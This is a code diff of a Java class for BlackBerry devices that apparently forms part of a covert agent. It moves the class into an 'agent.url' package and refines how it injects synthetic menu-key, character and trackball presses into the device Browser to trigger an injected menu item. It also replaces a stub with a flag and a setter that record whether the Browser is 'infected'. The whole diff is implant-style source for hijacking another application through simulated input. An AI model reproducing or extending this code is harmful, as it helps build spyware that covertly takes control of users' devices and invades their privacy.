@@ -1,13 +1,15 @@
-package blackberry.injection;
+package blackberry.agent.url;
 
 import net.rim.device.api.system.RuntimeStore;
 import net.rim.device.api.ui.Keypad;
-import blackberry.agent.url.BrowserMenuItem;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
+import blackberry.injection.AppInjectorInterface;
+import blackberry.injection.KeyInjector;
 import blackberry.interfaces.Singleton;
+import blackberry.utils.Utils;
 
-class AppInjectorBrowser implements AppInjectorInterface, Singleton {
+public class AppInjectorBrowser implements AppInjectorInterface, Singleton {
     //#ifdef DEBUG
     private static Debug debug = new Debug("AppInjBrowser", DebugLevel.VERBOSE);
     //#endif
@@ -16,6 +18,8 @@ class AppInjectorBrowser implements AppInjectorInterface, Singleton {
 
     private static AppInjectorBrowser instance;
     private static final long GUID = 0xa2b7338e410f087bL;
+    
+    boolean infected;
 
     public static synchronized AppInjectorBrowser getInstance() {
         if (instance == null) {
@@ -35,10 +39,6 @@ class AppInjectorBrowser implements AppInjectorInterface, Singleton {
         
     }
 
-    public boolean requestForeground() {
-        return true;
-    }
-
     public boolean injectMenu() {
         menu.addMenuBrowser();
         return true;
@@ -56,17 +56,16 @@ class AppInjectorBrowser implements AppInjectorInterface, Singleton {
         //#endif
 
         KeyInjector.pressRawKeyCode(Keypad.KEY_MENU);
-        // Utils.sleep(100);
+        Utils.sleep(500);
         KeyInjector.pressRawKey(menu.toString().charAt(0));
-        // Utils.sleep(500);
-        KeyInjector.trackBallClick();
+        Utils.sleep(500);
+        //KeyInjector.trackBallClick();
+        KeyInjector.trackBallRawClick();
 
         return true;
-
     }
 
     public String getAppName() {
-
         return "Browser";
     }
 
@@ -75,9 +74,12 @@ class AppInjectorBrowser implements AppInjectorInterface, Singleton {
 
     }
 
-    public boolean isInfected() {
-        // TODO Auto-generated method stub
-        return false;
+    public boolean isInfected() {        
+        return infected;
+    }
+
+    public void setInfected() {
+        infected = true;
     }
 
 
